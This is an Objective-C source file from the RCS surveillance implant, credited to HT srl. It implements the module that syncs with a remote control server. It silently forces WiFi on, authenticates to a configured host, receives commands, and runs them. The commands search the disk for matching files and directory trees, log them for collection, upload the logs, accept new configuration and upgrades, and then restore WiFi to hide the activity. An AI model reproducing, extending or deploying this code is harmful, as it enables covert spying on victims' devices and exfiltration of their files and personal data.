/*
 * RCSMac - RESTNetworkProtocol
 *  Implementation for REST Protocol.
 *
 *
 * Created by revenge on 12/01/2011
 * Copyright (C) HT srl 2011. All rights reserved
 *
 */

#import <notify.h>

#import "RESTNetworkProtocol.h"
#import "RESTTransport.h"

#import "AuthNetworkOperation.h"
#import "IDNetworkOperation.h"
#import "ConfNetworkOperation.h"
#import "DownloadNetworkOperation.h"
#import "UploadNetworkOperation.h"
#import "UpgradeNetworkOperation.h"
#import "FSNetworkOperation.h"
#import "LogNetworkOperation.h"
#import "ByeNetworkOperation.h"

#import "RCSICommon.h"
#import "RCSIFileSystemManager.h"
#import "RCSITaskManager.h"

//#import "RCSMLogger.h"
//#import "RCSMDebug.h"

//#define DEBUG_PROTO
//#define infoLog NSLog
//#define errorLog NSLog
//#define warnLog NSLog

typedef struct _sync {
  u_int gprsFlag;  // bit 0 = Sync ON - bit 1 = Force
  u_int wifiFlag;
  u_int serverHostLength;
  wchar_t serverHost[256];
} syncStruct;


@implementation RESTNetworkProtocol

- (id)initWithConfiguration: (NSData *)aConfiguration
{
  if ((self = [super init]))
    {
      if (aConfiguration == nil)
        {
#ifdef DEBUG_PROTO
          errorLog(@"configuration is nil");
#endif
          
          return nil;
        }
      
#ifdef DEBUG_PROTO
      NSLog(@"configuration: %@", aConfiguration);
#endif

      syncStruct *header  = (syncStruct *)[aConfiguration bytes];
      mMinDelay           = 0;
      mMaxDelay           = 0;
      mBandwidthLimit     = 10000000;
      
      mWifiForce  = header->wifiFlag;
      mGprsForce  = header->gprsFlag;
      mWifiForced = NO;
    
      NSString *host = [[NSString alloc] initWithCharacters: (unichar *)header->serverHost
                                                     length: header->serverHostLength / 2 - 1];

      NSString *_url;
      _url = [[NSString alloc] initWithFormat: @"http://%@:%d", host, 80];
      mURL    = [[NSURL alloc] initWithString: _url];
      [_url release];
    
#ifdef DEBUG_PROTO
      infoLog(@"wifi : %d", mWifiForce);
      infoLog(@"gprs : %d", mGprsForce);
      infoLog(@"host : %@", host);
      infoLog(@"URL  : %@", mURL);
#endif
    
      return self;
    }
  
  return nil;
}

- (void)dealloc
{
  [mURL release];
  [super dealloc];
}

// Abstract Class Methods
- (BOOL)perform
{
  NSAutoreleasePool *outerPool = [[NSAutoreleasePool alloc] init];
  
  // Check first what kind of connection we need/have
  NetworkStatus status = [self getAvailableConnection];
  if (status == NotReachable)
    {
#ifdef DEBUG_PROTO
      warnLog(@"No connection available");
#endif
      // No connection, see if we have to force something
      if (mWifiForce)
        {
          // Force Wifi Connection
#ifdef DEBUG_PROTO
          infoLog(@"Forcing WiFi Connection");
#endif
          mWifiForced = YES;
          notify_post("com.apple.Preferences.WiFiOn");
          // Now sleep in order to wait for the wifi connection
          sleep(5);
        }
      else if (mGprsForce)
        {
          // Force GPRS Connection
#ifdef DEBUG_PROTO
          infoLog(@"Forcing GPRS Connection");
#endif
        }
    }
  
  // Init the transport
  RESTTransport *transport = [[RESTTransport alloc] initWithURL: mURL
                                                         onPort: 80];
  
  AuthNetworkOperation *authOP = [[AuthNetworkOperation alloc]
                                  initWithTransport: transport];
  if ([authOP perform] == NO)
    {
#ifdef DEBUG_PROTO
      errorLog(@"Error on AUTH");
#endif
      
      [authOP release];
      [transport release];
      [outerPool release];
      
      if (mWifiForced)
        {
          notify_post("com.apple.Preferences.WiFiOff");
        }
    
      return NO;
    }
  
  [authOP release];
  
  IDNetworkOperation *idOP     = [[IDNetworkOperation alloc]
                                  initWithTransport: transport];
  if ([idOP perform] == NO)
    {
#ifdef DEBUG_PROTO
      errorLog(@"Error on ID");
#endif
      
      [idOP release];
      [transport release];
      [outerPool release];
      
      if (mWifiForced)
        {
          notify_post("com.apple.Preferences.WiFiOff");
        }
    
      return NO;
    }
  
  NSMutableArray *commandList = [[idOP getCommands] retain];
  [idOP release];
  
#ifdef DEBUG_PROTO
  infoLog(@"commands available: %@", commandList);
#endif
  
  int i = 0;
  
  for (; i < [commandList count]; i++)
    {
      uint32_t command = [[commandList objectAtIndex: i] unsignedIntValue];
      
      switch (command)
        {
        case PROTO_NEW_CONF:
          {
            ConfNetworkOperation *confOP = [[ConfNetworkOperation alloc]
                                            initWithTransport: transport];
            if ([confOP perform] == NO)
              {
#ifdef DEBUG_PROTO
                errorLog(@"Error on CONF");
#endif
              }
            
            [confOP release];
          } break;
        case PROTO_DOWNLOAD:
          {
            DownloadNetworkOperation *downOP = [[DownloadNetworkOperation alloc]
                                                initWithTransport: transport];
            if ([downOP perform] == NO)
              {
#ifdef DEBUG_PROTO
                errorLog(@"Error on DOWNLOAD");
#endif
              }
            else
              {
                NSArray *files = [downOP getDownloads];
                
                if ([files count] > 0)
                  {
                    RCSIFileSystemManager *fsManager = [[RCSIFileSystemManager alloc] init];
                    
                    for (NSString *fileMask in files)
                      {
#ifdef DEBUG_PROTO
                        infoLog(@"(PROTO_DOWNLOAD) Logging %@", fileMask);
#endif
                        
                        NSArray *filesFound = [fsManager searchFilesOnHD: fileMask];
                        if (filesFound == nil)
                          {
#ifdef DEBUG_PROTO
                            errorLog(@"fileMask (%@) didn't match any files", fileMask);
#endif
                            continue;
                          }
                        
                        for (NSString *file in filesFound)
                          {
#ifdef DEBUG_PROTO
                            infoLog(@"createLogForFile (%@)", file);
#endif
                            [fsManager logFileAtPath: file];
                          }
                      }
                    
                    [fsManager release];
                  }
                else
                  {
#ifdef DEBUG_PROTO
                    errorLog(@"(PROTO_DOWNLOAD) no file available");
#endif
                  }
              }
            
            [downOP release];
          } break;
        case PROTO_UPLOAD:
          {
            UploadNetworkOperation *upOP = [[UploadNetworkOperation alloc]
                                            initWithTransport: transport];
            
            if ([upOP perform] == NO)
              {
#ifdef DEBUG_PROTO
                errorLog(@"Error on UPLOAD");
#endif
              }
            
            [upOP release];
          } break;
        case PROTO_UPGRADE:
          {
            UpgradeNetworkOperation *upgradeOP = [[UpgradeNetworkOperation alloc]
                                                  initWithTransport: transport];
            
            if ([upgradeOP perform] == NO)
              {
#ifdef DEBUG_PROTO
                errorLog(@"Error on UPGRADE");
#endif
              }
            
            [upgradeOP release];
          } break;
        case PROTO_FILESYSTEM:
          {
            FSNetworkOperation *fsOP = [[FSNetworkOperation alloc]
                                        initWithTransport: transport];
            if ([fsOP perform] == NO)
              {
#ifdef DEBUG_PROTO
                errorLog(@"Error on FS");
#endif
              }
            else
              {
                NSArray *paths = [fsOP getPaths];
#ifdef DEBUG_PROTO
                infoLog(@"paths: %@", paths);
#endif
                
                if ([paths count] > 0)
                  {
                    RCSIFileSystemManager *fsManager = [[RCSIFileSystemManager alloc] init];
                    
                    for (NSDictionary *dictionary in paths)
                      {
                        NSString *path = [dictionary objectForKey: @"path"];
                        uint32_t depth = [[dictionary objectForKey: @"depth"] unsignedIntValue];
                        
#ifdef DEBUG_PROTO
                        infoLog(@"(PROTO_FS) path : %@", path);
                        infoLog(@"(PROTO_FS) depth: %d", depth);
#endif
                        
                        [fsManager logDirContent: path
                                       withDepth: depth];
                      }
                    
                    [fsManager release];
                  }
                else
                  {
#ifdef DEBUG_PROTO
                    errorLog(@"(PROTO_FS) no path availalble");
#endif
                  }
              }
            
            [fsOP release];
          } break;
        default:
          {
#ifdef DEBUG_PROTO
            errorLog(@"Received an unknown command (%d)", command);
#endif
          } break;
        }
    }
  
  LogNetworkOperation *logOP = [[LogNetworkOperation alloc]
                                initWithTransport: transport];
  
  if ([logOP perform] == NO)
    {
#ifdef DEBUG_PROTO
      errorLog(@"Error on LOG");
#endif
    }
  
  [logOP release];
  
  ByeNetworkOperation *byeOP = [[ByeNetworkOperation alloc]
                                initWithTransport: transport];
  if ([byeOP perform] == NO)
    {
#ifdef DEBUG_PROTO
      errorLog(@"WTF error on BYE?!");
#endif
    }
  
  [byeOP release];
  
  if (mWifiForced)
    {
      notify_post("com.apple.Preferences.WiFiOff");
    }
  
  //
  // Time to reload the configuration, if needed
  // TODO: Refactor this
  //
  RCSITaskManager *_taskManager = [RCSITaskManager sharedInstance];
  
  if (_taskManager.mShouldReloadConfiguration == YES)
    {
#ifdef DEBUG_PROTO
      warnLog(@"Loading new configuration");
#endif
      [_taskManager reloadConfiguration];
    }
  else
    {
#ifdef DEBUG_PROTO
      warnLog(@"No new configuration");
#endif
    }
  
  [commandList release];
  [transport release];
  [outerPool release];
  
  return YES;
}
// End Of Abstract Class Methods

- (NetworkStatus)getAvailableConnection
{
  Reachability *reachability   = [Reachability reachabilityForInternetConnection];
  NetworkStatus internetStatus = [reachability currentReachabilityStatus];
  
  return internetStatus;
}

@end